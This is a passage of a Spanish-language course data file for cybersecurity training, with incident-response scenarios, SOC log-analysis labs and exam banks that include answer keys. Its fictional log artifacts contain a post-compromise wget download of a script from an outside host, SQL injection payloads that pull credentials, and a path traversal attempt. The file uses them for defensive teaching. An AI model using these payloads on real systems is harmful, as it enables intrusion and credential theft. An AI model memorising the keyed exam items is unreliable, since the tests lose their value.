              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'gra_capstone',
        title: "7. 🧩 Caso Integrador: Ataque a la Cadena de Suministro del Sector",
        content: [
          { type: 'text', icon: 'SpyIcon', text: "Caso final: un proveedor de software usado por muchas entidades de un sector fue comprometido y distribuyó una actualización maliciosa. Usted lidera el CSIRT sectorial ficticio." },
          {
            type: 'scenario',
            title: 'Caso integrador: la actualización envenenada',
            intro: "Un fabricante ficticio de software contable usado por 60 entidades del sector distribuyó una actualización con una puerta trasera. Necesita 80 de 100 puntos.",
            start: 'x1',
            maxPoints: 100,
            passPoints: 80,
            steps: {
              x1: {
                text: "Recibe el aviso de un CSIRT internacional con indicadores, marcado TLP:AMBER. ¿Qué hace primero?",
                choices: [
                  { text: "Valido los indicadores, identifico qué entidades del sector usan el software y les envío una alerta con acciones inmediatas, respetando el TLP:AMBER.", next: 'x2', points: 20, feedback: "Correcto: validar, delimitar el alcance y alertar rápido a quienes están expuestos." },
                  { text: "Publico la alerta completa en redes sociales para llegar a todos.", next: 'x2', points: -10, feedback: "Viola el TLP:AMBER y rompe la confianza de quien compartió." },
                ]
              },
              x2: {
                text: "¿Qué acción inmediata recomienda a las entidades?",
                choices: [
                  { text: "Aislar los servidores con la versión afectada, buscar los indicadores en sus registros y no aplicar actualizaciones del fabricante hasta que confirme una versión limpia.", next: 'x3', points: 20, feedback: "Bien: contención y búsqueda, sin profundizar el daño." },
                  { text: "Desinstalar el software de inmediato en todas partes sin revisar nada.", next: 'x3', points: 5, feedback: "Puede detener la operación contable y destruir evidencia; se necesita un enfoque más medido." },
                ]
              },
              x3: {
                text: "Tres entidades encuentran conexiones a los servidores del atacante. ¿Cómo prioriza el apoyo del CSIRT?",
                choices: [
                  { text: "Primero las comprometidas, por impacto: las que manejan más datos sensibles o servicios críticos, con apoyo forense y de contención.", next: 'x4', points: 20, feedback: "Correcto: triage aplicado a nivel sectorial." },
                  { text: "Por orden de llegada de los correos.", next: 'x4', points: 0, feedback: "El orden de llegada no refleja el riesgo." },
                ]
              },
              x4: {
                text: "El fabricante pide no mencionar su nombre en ninguna comunicación. ¿Qué hace?",
                choices: [
                  { text: "Coordino con él los tiempos y el contenido, pero las entidades afectadas necesitan saber qué producto revisar: la protección de las víctimas prima.", next: 'x5', points: 20, feedback: "Bien: coordinación sí, ocultamiento que deje expuestas a las víctimas, no." },
                  { text: "Acepto: el fabricante es un aliado importante.", next: 'x5', points: -10, feedback: "Sin nombrar el producto, las entidades no pueden protegerse." },
                ]
              },
              x5: {
                text: "Superada la crisis, ¿qué deja el CSIRT al sector?",
                choices: [
                  { text: "Un informe con línea de tiempo, indicadores compartibles, lecciones aprendidas y recomendaciones de gestión de proveedores (cláusulas de notificación, verificación de actualizaciones, ejercicios conjuntos).", next: 'fin', points: 20, feedback: "Excelente: el sector sale más preparado." },
                  { text: "Un agradecimiento a los participantes.", next: 'fin', points: 0, feedback: "Agradecer está bien, pero sin informe ni recomendaciones no hay mejora." },
                ]
              },
              fin: { text: "Fin del caso integrador. Si aprobó, está listo para el examen final." },
            }
          },
        ]
      },
      {
        id: 'gra_exam',
        title: "8. 📝 Examen del Nivel Avanzado",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Examen final de la ruta Gestor de Respuesta a Incidentes: 12 preguntas al azar de un banco de 16, con 80% para aprobar." },
          {
            type: 'exam',
            title: 'Examen: Gestor de Respuesta a Incidentes · Avanzado',
            description: 'Evalúa gestión de incidentes mayores, ejercicios de mesa, reporte a autoridades, divulgación coordinada y lecciones aprendidas.',
            passPercent: 80,
            questionsPerAttempt: 12,
            questions: [
              { question: '¿Qué es lo primero en la primera hora de un incidente mayor?', options: [{ id: 's1a', text: 'Establecer la estructura de mando, la vocería única y la bitácora de decisiones.', isCorrect: true, score: 10 }, { id: 's1b', text: 'Que el líder revise personalmente los servidores.', isCorrect: false, score: 0 }, { id: 's1c', text: 'Esperar a tener toda la información.', isCorrect: false, score: 0 }], feedback: 'Sin estructura, el caos multiplica los errores.' },
              { question: 'En un incidente mayor, ¿quién decide sobre el negocio (cerrar un servicio, pagar un rescate)?', options: [{ id: 's2a', text: 'La dirección, con las opciones y riesgos que presenta el equipo.', isCorrect: true, score: 10 }, { id: 's2b', text: 'El técnico de turno.', isCorrect: false, score: 0 }, { id: 's2c', text: 'El atacante.', isCorrect: false, score: 0 }], feedback: 'El equipo técnico informa y recomienda.' },
              { question: '¿Garantiza el pago de un rescate la recuperación de los datos?', options: [{ id: 's3a', text: 'No: no garantiza el descifrado ni que los datos no se publiquen.', isCorrect: true, score: 10 }, { id: 's3b', text: 'Sí, siempre.', isCorrect: false, score: 0 }, { id: 's3c', text: 'Solo si se paga rápido.', isCorrect: false, score: 0 }], feedback: 'Es una de las razones para no depender del pago.' },
              { question: 'Un sitio aún no afectado comparte red con los cifrados. ¿Qué se recomienda?', options: [{ id: 's4a', text: 'Aislar su conexión y activar la contingencia.', isCorrect: true, score: 10 }, { id: 's4b', text: 'Mantenerlo conectado.', isCorrect: false, score: 0 }, { id: 's4c', text: 'Apagar toda la ciudad.', isCorrect: false, score: 0 }], feedback: 'Se protege lo que aún funciona.' },
              { question: '¿Qué es un ejercicio de mesa (tabletop)?', options: [{ id: 's5a', text: 'Una simulación de un incidente en sala, sin tocar sistemas, para probar decisiones y procedimientos.', isCorrect: true, score: 10 }, { id: 's5b', text: 'Un ataque real controlado contra la red.', isCorrect: false, score: 0 }, { id: 's5c', text: 'Una auditoría documental.', isCorrect: false, score: 0 }], feedback: 'Su valor está en las brechas que revela.' },
              { question: 'En un ejercicio de mesa, ¿qué son las "inyecciones"?', options: [{ id: 's6a', text: 'Información nueva que llega durante el ejercicio para provocar decisiones.', isCorrect: true, score: 10 }, { id: 's6b', text: 'Ataques de inyección SQL.', isCorrect: false, score: 0 }, { id: 's6c', text: 'El presupuesto del ejercicio.', isCorrect: false, score: 0 }], feedback: 'Por ejemplo, una llamada de la prensa o una nota de rescate.' },
              { question: 'Un incidente expuso datos personales de clientes en Colombia. ¿A qué autoridad se informa?', options: [{ id: 's7a', text: 'A la Superintendencia de Industria y Comercio.', isCorrect: true, score: 10 }, { id: 's7b', text: 'A ninguna.', isCorrect: false, score: 0 }, { id: 's7c', text: 'Solo a los medios.', isCorrect: false, score: 0 }], feedback: 'Es la autoridad de protección de datos (Ley 1581).' },
              { question: '¿Qué circular de la Supersolidaria aplica a la seguridad de la información en cooperativas?', options: [{ id: 's8a', text: 'La Circular Externa 36 de 2022.', isCorrect: true, score: 10 }, { id: 's8b', text: 'La Ley 1273 de 2009.', isCorrect: false, score: 0 }, { id: 's8c', text: 'El RFC 2350.', isCorrect: false, score: 0 }], feedback: 'Incluye requisitos y reporte de incidentes.' },
              { question: '¿Qué busca la divulgación coordinada de vulnerabilidades?', options: [{ id: 's9a', text: 'Que el fabricante corrija la falla antes de que se haga pública.', isCorrect: true, score: 10 }, { id: 's9b', text: 'Ocultar la falla para siempre.', isCorrect: false, score: 0 }, { id: 's9c', text: 'Vender la falla al mejor postor.', isCorrect: false, score: 0 }], feedback: 'Equilibra la corrección con el derecho a saber.' },
              { question: 'Durante el plazo acordado de divulgación se detecta explotación activa. ¿Qué hace el CSIRT?', options: [{ id: 's10a', text: 'Adelanta una alerta a los usuarios del producto para que se protejan.', isCorrect: true, score: 10 }, { id: 's10b', text: 'Espera la fecha acordada.', isCorrect: false, score: 0 }, { id: 's10c', text: 'Cierra el caso.', isCorrect: false, score: 0 }], feedback: 'La protección de las víctimas prima sobre el calendario.' },
              { question: '¿Cómo debe ser la revisión posterior al incidente?', options: [{ id: 's11a', text: 'Sin buscar culpables, enfocada en por qué el sistema lo permitió.', isCorrect: true, score: 10 }, { id: 's11b', text: 'Para identificar a quién sancionar.', isCorrect: false, score: 0 }, { id: 's11c', text: 'Opcional.', isCorrect: false, score: 0 }], feedback: 'Así la gente reporta y se aprende.' },
              { question: '¿Por qué "error humano" no es una buena causa raíz?', options: [{ id: 's12a', text: 'Porque no dice qué control o proceso cambiar.', isCorrect: true, score: 10 }, { id: 's12b', text: 'Porque los humanos no cometen errores.', isCorrect: false, score: 0 }, { id: 's12c', text: 'Porque es demasiado específica.', isCorrect: false, score: 0 }], feedback: 'La causa raíz debe ser accionable.' },
              { question: '¿Qué asegura que las lecciones aprendidas se cumplan?', options: [{ id: 's13a', text: 'Acciones con responsable, fecha e indicador, revisadas periódicamente.', isCorrect: true, score: 10 }, { id: 's13b', text: 'Enviar el informe por correo.', isCorrect: false, score: 0 }, { id: 's13c', text: 'Archivar el informe.', isCorrect: false, score: 0 }], feedback: 'Sin seguimiento, se repite el incidente.' },
              { question: 'Recibe indicadores marcados TLP:AMBER de un CSIRT internacional. ¿Puede publicarlos en redes?', options: [{ id: 's14a', text: 'No: AMBER limita su difusión a quienes necesitan saberlo.', isCorrect: true, score: 10 }, { id: 's14b', text: 'Sí, para alertar a todos.', isCorrect: false, score: 0 }, { id: 's14c', text: 'Sí, si quita el logo.', isCorrect: false, score: 0 }], feedback: 'Respetar el TLP sostiene la confianza.' },
              { question: 'En un ataque a la cadena de suministro, ¿qué se recomienda primero a las entidades?', options: [{ id: 's15a', text: 'Aislar los sistemas con la versión afectada y buscar los indicadores en sus registros.', isCorrect: true, score: 10 }, { id: 's15b', text: 'Instalar más actualizaciones del mismo fabricante de inmediato.', isCorrect: false, score: 0 }, { id: 's15c', text: 'No hacer nada hasta el informe final.', isCorrect: false, score: 0 }], feedback: 'Contener y buscar, sin profundizar el daño.' },
              { question: 'El fabricante comprometido pide no ser nombrado. ¿Qué prima?', options: [{ id: 's16a', text: 'Que las entidades afectadas sepan qué producto revisar para protegerse.', isCorrect: true, score: 10 }, { id: 's16b', text: 'La reputación del fabricante.', isCorrect: false, score: 0 }, { id: 's16c', text: 'El silencio total.', isCorrect: false, score: 0 }], feedback: 'Se coordina con el fabricante, sin dejar expuestas a las víctimas.' },
            ],
          },
        ]
      },
    ]
  },
  cybersecurity_intermedio: {
    title: "Analista de Ciberseguridad · Nivel Intermedio",
    description: "El trabajo diario de un analista de SOC: leer registros, detectar fuerza bruta y ataques web, gestionar vulnerabilidades con CVSS, endurecer sistemas y revisar la exposición de red. Laboratorios prácticos y examen con nota mínima del 70%.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'aci_intro',
        title: "1. 🗺️ Bienvenida al Nivel Intermedio",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "En el Nivel Básico conoció los conceptos, las amenazas y el hacking ético. Ahora se sienta en la consola de un Centro de Operaciones de Seguridad (SOC): analizará registros reales (ficticios), decidirá qué es un ataque y qué es ruido, y priorizará qué corregir primero." },
          { type: 'text', icon: 'AlarmIcon', text: "Este nivel incluye laboratorios de decisión, retos tipo CTF y un examen que se aprueba con 70%. Todos los sistemas, direcciones y datos son ficticios." },
          {
            type: 'interactive',
            title: 'Vocabulario del SOC',
            items: [
              { term: 'SOC', definition: 'Centro de Operaciones de Seguridad: el equipo que vigila, detecta y responde a los eventos de seguridad de una organización.' },
              { term: 'SIEM', definition: 'Plataforma que centraliza y correlaciona los registros de muchas fuentes para generar alertas.' },
              { term: 'Alerta / falso positivo', definition: 'Una alerta es una posible amenaza; un falso positivo es una alerta que resulta ser actividad legítima.' },
              { term: 'Superficie de ataque', definition: 'Todo lo que un atacante podría intentar usar: servicios expuestos, cuentas, aplicaciones, proveedores.' },
              { term: 'Endurecimiento (hardening)', definition: 'Reducir la superficie de ataque: desactivar lo innecesario, aplicar configuraciones seguras y actualizar.' },
            ]
          },
        ]
      },
      {
        id: 'aci_bruteforce',
        title: "2. 🚩 Laboratorio: ¿Fuerza Bruta o Rociado de Contraseñas?",
        content: [
          { type: 'text', icon: 'LockIcon', text: "En la fuerza bruta (MITRE ATT&CK T1110) se prueban muchas contraseñas contra una cuenta. En el rociado de contraseñas (T1110.003) se prueba una o pocas contraseñas comunes contra muchas cuentas, para no activar el bloqueo por intentos fallidos. Distinguirlos cambia la respuesta." },
          {
            type: 'challenge',
            title: 'El servidor SSH bajo ataque',
            brief: "Estos son extractos ficticios de /var/log/auth.log de un servidor Linux expuesto a internet. Analícelos.",
            artifacts: [
              {
                name: 'auth.log',
                content: `Oct 24 03:10:01 srv-web sshd[2210]: Failed password for root from 203.0.113.50 port 51122 ssh2
Oct 24 03:10:02 srv-web sshd[2212]: Failed password for root from 203.0.113.50 port 51124 ssh2
Oct 24 03:10:03 srv-web sshd[2214]: Failed password for root from 203.0.113.50 port 51126 ssh2
... (412 intentos más contra root desde 203.0.113.50 entre 03:10 y 03:24)
Oct 24 05:02:11 srv-web sshd[3301]: Failed password for invalid user ana from 198.51.100.9 port 40012 ssh2
Oct 24 05:02:12 srv-web sshd[3303]: Failed password for invalid user carlos from 198.51.100.9 port 40014 ssh2
Oct 24 05:02:13 srv-web sshd[3305]: Failed password for deploy from 198.51.100.9 port 40016 ssh2
Oct 24 05:02:14 srv-web sshd[3307]: Failed password for invalid user maria from 198.51.100.9 port 40018 ssh2
Oct 24 05:02:15 srv-web sshd[3309]: Accepted password for backup from 198.51.100.9 port 40020 ssh2
Oct 24 05:02:40 srv-web sudo:   backup : TTY=pts/0 ; COMMAND=/usr/bin/wget http://203.0.113.80/x.sh`,
              },
            ],
            questions: [
              { prompt: '¿Qué IP hizo fuerza bruta contra una sola cuenta?', answers: ['203.0.113.50'], explanation: '203.0.113.50 hizo más de 400 intentos contra root: fuerza bruta clásica. Sin éxito, pero confirma que SSH está expuesto con autenticación por contraseña.' },
              { prompt: '¿Qué IP hizo rociado de contraseñas contra varias cuentas?', answers: ['198.51.100.9'], explanation: '198.51.100.9 probó un intento por cuenta en varias cuentas: rociado de contraseñas.' },
              { prompt: '¿Con qué cuenta logró entrar el atacante?', answers: ['backup'], explanation: 'La cuenta backup aceptó la contraseña: probablemente débil o por defecto. Es el hallazgo crítico.' },
              { prompt: '¿Qué comando ejecutó tras entrar? (nombre del programa)', answers: ['wget', '/usr/bin/wget'], explanation: 'Descargó un script (x.sh) con wget: el inicio de la siguiente fase del ataque. Hay que aislar el servidor y analizar ese script.' },
            ],
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Qué control habría evitado este compromiso con mayor efectividad?",
              options: [
                "Cambiar el puerto de SSH al 2222.",
                "Desactivar la autenticación por contraseña en SSH y usar llaves o doble factor, además de restringir el acceso por IP o VPN.",
                "Pedir a los atacantes que se detengan."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: sin contraseñas que adivinar, la fuerza bruta y el rociado pierden su efecto. Cambiar el puerto solo reduce el ruido.",
                incorrect: "Cambiar el puerto es ocultamiento, no protección. El control efectivo es eliminar la autenticación por contraseña y limitar quién puede conectarse."
              }
            }
          },
        ]
      },
      {
        id: 'aci_web',
        title: "3. 🚩 Laboratorio: Ataques Web en los Registros",
        content: [
          { type: 'text', icon: 'BugIcon', text: "Los registros de un servidor web revelan intentos de ataque: inyección SQL (comillas, OR 1=1, UNION SELECT), recorrido de directorios (../../etc/passwd) o búsqueda de paneles de administración. El código de respuesta indica si el intento tuvo éxito: 200 (respondió), 404 (no existe), 500 (provocó un error)." },
          {
            type: 'challenge',
            title: 'El portal de asociados',
            brief: "Registro de acceso ficticio del portal web de una cooperativa. Identifique los ataques y si alguno tuvo éxito.",
            artifacts: [
              {
                name: 'access.log',
                content: `203.0.113.91 - - [24/Oct/2026:10:01:12] "GET /admin HTTP/1.1" 404 210
203.0.113.91 - - [24/Oct/2026:10:01:13] "GET /wp-login.php HTTP/1.1" 404 210
203.0.113.91 - - [24/Oct/2026:10:02:40] "GET /descargas?archivo=../../../../etc/passwd HTTP/1.1" 403 199
203.0.113.91 - - [24/Oct/2026:10:05:02] "GET /asociados?id=105' HTTP/1.1" 500 1893
203.0.113.91 - - [24/Oct/2026:10:05:30] "GET /asociados?id=105 OR 1=1-- HTTP/1.1" 200 482113
203.0.113.91 - - [24/Oct/2026:10:06:15] "GET /asociados?id=105 UNION SELECT usuario,clave FROM usuarios-- HTTP/1.1" 200 9120
198.51.100.30 - - [24/Oct/2026:10:07:00] "GET /asociados?id=212 HTTP/1.1" 200 1450`,
              },
            ],
            questions: [
              { prompt: '¿Qué parámetro de la aplicación es vulnerable a inyección SQL?', answers: ['id'], explanation: 'El parámetro id de /asociados: la comilla provocó un error 500 y "OR 1=1" devolvió muchísimos datos.' },
              { prompt: '¿Qué código de respuesta demuestra que "OR 1=1" funcionó? (número)', answers: ['200'], hint: 'Compare también el tamaño de la respuesta con una consulta normal.', explanation: 'Respuesta 200 con 482.113 bytes, frente a ~1.450 de una consulta normal: la aplicación devolvió los datos de todos los asociados.' },
              { prompt: '¿El intento de recorrido de directorios (../etc/passwd) tuvo éxito? (sí/no)', answers: ['no'], explanation: 'Respondió 403 (prohibido): ese intento fue bloqueado. La inyección SQL, en cambio, sí tuvo éxito.' },
              { prompt: '¿Qué tabla intentó leer el atacante con UNION SELECT?', answers: ['usuarios'], explanation: 'Intentó extraer usuario y clave de la tabla usuarios, y recibió respuesta 200: posible robo de credenciales. Es un incidente crítico.' },
            ],
          },
        ]
      },
      {
        id: 'aci_vulns',
        title: "4. Gestión de Vulnerabilidades",
        content: [
          { type: 'text', icon: 'AlarmIcon', text: "Nadie puede parchar todo al mismo tiempo: hay que priorizar. El puntaje CVSS mide la severidad técnica (0,1–3,9 baja; 4,0–6,9 media; 7,0–8,9 alta; 9,0–10,0 crítica), pero la prioridad real también depende de si la vulnerabilidad se explota activamente y de qué tan expuesto y crítico es el activo." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "Fuentes útiles: el catálogo KEV de CISA lista vulnerabilidades explotadas activamente, y el puntaje EPSS (de FIRST) estima la probabilidad de que una vulnerabilidad sea explotada pronto. Combinarlos con el CVSS evita perder tiempo en lo crítico teórico y olvidar lo que se está atacando hoy." },
          {
            type: 'scenario',
            title: 'Caso 1: tres vulnerabilidades, una ventana de mantenimiento',
            intro: "Solo tiene una ventana de mantenimiento esta semana. Ordene con criterio. Necesita 40 de 60 puntos.",
            start: 'v1',
            maxPoints: 60,
            passPoints: 40,
            steps: {
              v1: {
                text: "¿Cuál parcha primero?",
                evidence: "A) CVSS 9.8 · servidor interno de pruebas sin datos reales · sin explotación conocida\nB) CVSS 8.1 · VPN expuesta a internet · en el catálogo KEV (explotada activamente)\nC) CVSS 5.3 · intranet · EPSS bajo",
                choices: [
                  { text: "B: está expuesta a internet y se explota activamente, aunque su CVSS sea menor que el de A.", next: 'v2', points: 20, feedback: "Correcto: exposición + explotación activa = máxima prioridad real." },
                  { text: "A: tiene el CVSS más alto.", next: 'v2', points: 0, feedback: "El CVSS mide severidad técnica, no el riesgo real: A está aislada y sin explotación conocida." },
                ]
              },
              v2: {
                text: "El fabricante de la VPN aún no publica el parche. ¿Qué hace?",
                choices: [
                  { text: "Aplico las mitigaciones recomendadas por el fabricante, refuerzo el monitoreo de esa VPN y busco indicios de explotación previa.", next: 'v3', points: 20, feedback: "Bien: mitigar y vigilar mientras llega el parche, y verificar que no hayan entrado ya." },
                  { text: "Espero el parche sin hacer nada.", next: 'v3', points: -10, feedback: "Una vulnerabilidad explotada activamente no puede esperar sin mitigación." },
                ]
              },
              v3: {
                text: "¿Cómo deja registro de A y C?",
                choices: [
                  { text: "Las registro con su prioridad, responsable y fecha límite según la política, y les hago seguimiento.", next: 'fin', points: 20, feedback: "Correcto: priorizar no es olvidar." },
                  { text: "Las ignoro porque no son urgentes.", next: 'fin', points: -10, feedback: "Las vulnerabilidades sin seguimiento se acumulan y terminan explotándose." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'aci_exposure',
        title: "5. 🚩 Laboratorio: Exposición de Red",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Un escaneo de la propia red muestra qué está expuesto. Servicios como escritorio remoto (3389), compartición de archivos SMB (445) o bases de datos (3306, MySQL) nunca deberían estar abiertos a internet; los servicios web (443) sí, pero actualizados y protegidos." },
          {
            type: 'challenge',
            title: 'Escaneo autorizado de las IP públicas',
            brief: "Usted ejecutó, con autorización escrita, un escaneo de las IP públicas de una entidad ficticia. Analice el resultado.",
            artifacts: [
              {
                name: 'escaneo_externo.txt',
                content: `Host 192.0.2.10 (portal.entidad.example)
  443/tcp  abierto  https   servidor web actualizado
  80/tcp   abierto  http    redirige a 443
Host 192.0.2.20 (srv-contabilidad)
  3389/tcp abierto  ms-wbt-server (Escritorio remoto)
  445/tcp  abierto  microsoft-ds (SMB)
Host 192.0.2.30 (db-asociados)
  3306/tcp abierto  mysql  versión 5.5 (sin soporte)`,
              },
            ],
            questions: [
              { prompt: '¿Qué host expone escritorio remoto a internet? (IP)', answers: ['192.0.2.20'], explanation: '192.0.2.20 expone RDP (3389), la puerta de entrada del ransomware en muchos casos reales. Debe cerrarse y accederse solo por VPN con doble factor.' },
              { prompt: '¿Qué puerto de base de datos está expuesto? (número)', answers: ['3306'], explanation: 'MySQL (3306) abierto a internet y en una versión sin soporte: riesgo crítico para los datos de asociados.' },
              { prompt: '¿Qué host está configurado correctamente para internet? (IP)', answers: ['192.0.2.10'], explanation: 'El portal solo expone web (443) y redirige el 80 a HTTPS: es lo esperado para un servicio público.' },
            ],
          },
        ]
      },
      {
        id: 'aci_hardening',
        title: "6. Endurecimiento y Controles Básicos",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Los Controles CIS (versión 8, 18 controles) y las guías de configuración CIS Benchmarks dan una ruta práctica para endurecer sistemas. Los primeros pasos tienen el mayor retorno: inventario de activos y software, configuraciones seguras, gestión de cuentas y accesos, y gestión continua de vulnerabilidades." },
          {
            type: 'flashcards',
            title: 'Controles de alto impacto',
            cards: [
              { front: 'Doble factor (MFA)', back: 'En correo, VPN, accesos remotos y cuentas administradoras. Frena la mayoría de los accesos con contraseñas robadas.' },
              { front: 'Mínimo privilegio', back: 'Cada cuenta con solo los permisos que necesita. Las cuentas de administración, separadas de las de uso diario.' },
              { front: 'Actualizaciones', back: 'Parches aplicados según prioridad de riesgo, empezando por lo expuesto y lo explotado activamente.' },
              { front: 'Respaldos 3-2-1', back: '3 copias, en 2 medios distintos, 1 fuera de línea o fuera del sitio. Y pruebas periódicas de restauración.' },
              { front: 'Registro centralizado', back: 'Enviar los registros a un SIEM o servidor central: si el atacante los borra localmente, la copia sobrevive.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Por qué la regla 3-2-1 exige una copia fuera de línea?",
              options: [
                "Porque es más barata.",
                "Porque el ransomware cifra o borra también los respaldos que están conectados a la red.",
                "Porque así los respaldos son más rápidos."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: una copia desconectada es la que permite recuperarse sin pagar.",
                incorrect: "La razón es el ransomware: busca y destruye los respaldos accesibles desde la red."
              }
            }
          },
        ]
      },
      {
        id: 'aci_exam',
        title: "7. 📝 Examen del Nivel Intermedio",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "El examen toma 10 preguntas al azar de un banco de 14 y se aprueba con 70%. Al aprobarlo obtendrá el badge de Analista de Ciberseguridad · Nivel Intermedio." },
          {
            type: 'exam',
            title: 'Examen: Analista de Ciberseguridad · Intermedio',
            description: 'Evalúa análisis de registros, fuerza bruta, ataques web, gestión de vulnerabilidades, exposición de red y endurecimiento.',
            passPercent: 70,
            questionsPerAttempt: 10,
            questions: [
              { question: '¿Qué hace un SIEM?', options: [{ id: 'k1a', text: 'Centraliza y correlaciona registros de muchas fuentes para generar alertas.', isCorrect: true, score: 10 }, { id: 'k1b', text: 'Cifra los discos.', isCorrect: false, score: 0 }, { id: 'k1c', text: 'Reemplaza al antivirus.', isCorrect: false, score: 0 }], feedback: 'Es la herramienta central de un SOC.' },
              { question: 'Muchas cuentas distintas reciben un solo intento con la misma contraseña. ¿Qué técnica es?', options: [{ id: 'k2a', text: 'Rociado de contraseñas (password spraying).', isCorrect: true, score: 10 }, { id: 'k2b', text: 'Fuerza bruta sobre una cuenta.', isCorrect: false, score: 0 }, { id: 'k2c', text: 'Inyección SQL.', isCorrect: false, score: 0 }], feedback: 'Evita el bloqueo por intentos fallidos.' },
              { question: '¿Qué control es más efectivo contra la fuerza bruta en SSH?', options: [{ id: 'k3a', text: 'Desactivar las contraseñas y usar llaves o doble factor, restringiendo el acceso.', isCorrect: true, score: 10 }, { id: 'k3b', text: 'Cambiar el puerto.', isCorrect: false, score: 0 }, { id: 'k3c', text: 'Ponerle un banner de advertencia.', isCorrect: false, score: 0 }], feedback: 'Sin contraseñas que adivinar, el ataque pierde efecto.' },
              { question: 'En un registro web, "?id=5 OR 1=1--" con respuesta 200 y un tamaño enorme indica…', options: [{ id: 'k4a', text: 'Una inyección SQL exitosa.', isCorrect: true, score: 10 }, { id: 'k4b', text: 'Un usuario normal.', isCorrect: false, score: 0 }, { id: 'k4c', text: 'Un ataque bloqueado.', isCorrect: false, score: 0 }], feedback: 'La aplicación devolvió más datos de los debidos.' },
              { question: 'Un intento de "../../etc/passwd" recibe respuesta 403. ¿Qué significa?', options: [{ id: 'k5a', text: 'Que fue bloqueado.', isCorrect: true, score: 10 }, { id: 'k5b', text: 'Que tuvo éxito.', isCorrect: false, score: 0 }, { id: 'k5c', text: 'Que el archivo no existe.', isCorrect: false, score: 0 }], feedback: '403 = prohibido.' },
              { question: '¿Qué rango de CVSS se considera crítico?', options: [{ id: 'k6a', text: '9,0 a 10,0.', isCorrect: true, score: 10 }, { id: 'k6b', text: '4,0 a 6,9.', isCorrect: false, score: 0 }, { id: 'k6c', text: '0,1 a 3,9.', isCorrect: false, score: 0 }], feedback: '7,0–8,9 es alta.' },
              { question: '¿Qué es el catálogo KEV de CISA?', options: [{ id: 'k7a', text: 'Una lista de vulnerabilidades que se explotan activamente.', isCorrect: true, score: 10 }, { id: 'k7b', text: 'Un antivirus gratuito.', isCorrect: false, score: 0 }, { id: 'k7c', text: 'Una norma de contraseñas.', isCorrect: false, score: 0 }], feedback: 'Ayuda a priorizar lo que se está atacando hoy.' },
              { question: 'Una vulnerabilidad CVSS 9,8 en un servidor aislado sin explotación conocida, frente a una 8,1 en una VPN expuesta y explotada. ¿Cuál va primero?', options: [{ id: 'k8a', text: 'La de la VPN expuesta y explotada.', isCorrect: true, score: 10 }, { id: 'k8b', text: 'La de 9,8 por tener mayor puntaje.', isCorrect: false, score: 0 }, { id: 'k8c', text: 'Ninguna.', isCorrect: false, score: 0 }], feedback: 'El riesgo real combina severidad, exposición y explotación.' },
              { question: '¿Qué estima el puntaje EPSS?', options: [{ id: 'k9a', text: 'La probabilidad de que una vulnerabilidad sea explotada pronto.', isCorrect: true, score: 10 }, { id: 'k9b', text: 'El costo de un parche.', isCorrect: false, score: 0 }, { id: 'k9c', text: 'La velocidad de la red.', isCorrect: false, score: 0 }], feedback: 'Lo publica FIRST.' },
              { question: '¿Qué servicio NO debería estar expuesto a internet?', options: [{ id: 'k10a', text: 'Escritorio remoto (puerto 3389).', isCorrect: true, score: 10 }, { id: 'k10b', text: 'Un portal web en HTTPS (443) actualizado.', isCorrect: false, score: 0 }, { id: 'k10c', text: 'Ninguno: todo debe estar expuesto.', isCorrect: false, score: 0 }], feedback: 'RDP expuesto es una entrada frecuente del ransomware.' },
              { question: '¿Qué puerto usa por defecto MySQL?', options: [{ id: 'k11a', text: '3306.', isCorrect: true, score: 10 }, { id: 'k11b', text: '443.', isCorrect: false, score: 0 }, { id: 'k11c', text: '22.', isCorrect: false, score: 0 }], feedback: 'Una base de datos nunca debe quedar expuesta a internet.' },
              { question: '¿Qué dice la regla de respaldos 3-2-1?', options: [{ id: 'k12a', text: '3 copias, 2 medios distintos, 1 fuera de línea o fuera del sitio.', isCorrect: true, score: 10 }, { id: 'k12b', text: '3 servidores, 2 redes, 1 firewall.', isCorrect: false, score: 0 }, { id: 'k12c', text: 'Respaldar cada 3 días a las 2 p. m.', isCorrect: false, score: 0 }], feedback: 'La copia fuera de línea resiste al ransomware.' },
              { question: '¿Qué significa el principio de mínimo privilegio?', options: [{ id: 'k13a', text: 'Cada cuenta tiene solo los permisos que necesita.', isCorrect: true, score: 10 }, { id: 'k13b', text: 'Todos son administradores para trabajar más rápido.', isCorrect: false, score: 0 }, { id: 'k13c', text: 'Nadie tiene permisos.', isCorrect: false, score: 0 }], feedback: 'Limita el daño de una cuenta comprometida.' },
              { question: '¿Por qué centralizar los registros en un SIEM o servidor externo?', options: [{ id: 'k14a', text: 'Para que sobrevivan aunque el atacante borre los registros locales.', isCorrect: true, score: 10 }, { id: 'k14b', text: 'Para liberar espacio.', isCorrect: false, score: 0 }, { id: 'k14c', text: 'No sirve.', isCorrect: false, score: 0 }], feedback: 'Y para correlacionar eventos de distintas fuentes.' },
            ],
          },
        ]
      },
    ]
  },
  cybersecurity_avanzado: {
    title: "Analista de Ciberseguridad · Nivel Avanzado",
    description: "Del analista que reacciona al que se anticipa: threat hunting con MITRE ATT&CK, ingeniería de detección con reglas Sigma, seguridad en la nube, Zero Trust, priorización de un informe de pentest y un turno nocturno en el SOC. Examen con nota mínima del 80%.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'aca_intro',
        title: "1. 🎯 Nivel Avanzado: Anticiparse al Atacante",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "Un analista avanzado no espera a que suene la alarma: formula hipótesis y sale a buscar al atacante (threat hunting), convierte lo que encuentra en reglas de detección, y ayuda a diseñar arquitecturas donde un compromiso no se convierta en desastre." },
